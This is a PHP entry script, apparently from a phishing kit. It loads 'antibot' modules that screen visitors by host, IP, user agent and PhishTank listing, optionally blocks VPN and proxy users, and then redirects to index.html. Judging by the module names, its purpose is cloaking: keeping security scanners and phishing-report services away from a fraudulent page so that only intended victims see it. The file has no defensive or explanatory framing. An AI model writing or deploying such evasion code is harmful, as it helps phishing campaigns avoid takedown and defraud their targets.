<?php
session_start();
error_reporting(0);
$antibots = trim(file_get_contents("admin/config/status_antibots.ini"));
$block_vpn = trim(file_get_contents("admin/config/blockVpn.ini"));
if($antibots == "on"){
include "antibots/#2.php";
include "antibots/#4.php";
include "antibots/#5.php";
include "antibots/#6.php";
include "antibots/#7.php";
include "antibots/#8.php";
include "antibots/#9.php";
include "antibots/#10.php";
include "antibots/#11.php";
include "antibots/#12.php";
include "antibots/antibot_host.php";
include "antibots/antibot_ip.php";
include "antibots/antibot_phishtank.php";
include "antibots/antibot_userAgent.php";
}
if($block_vpn == "on") {
    require_once 'antibots/proxyblock.php';
    
}
header("Location: index.html");
?>
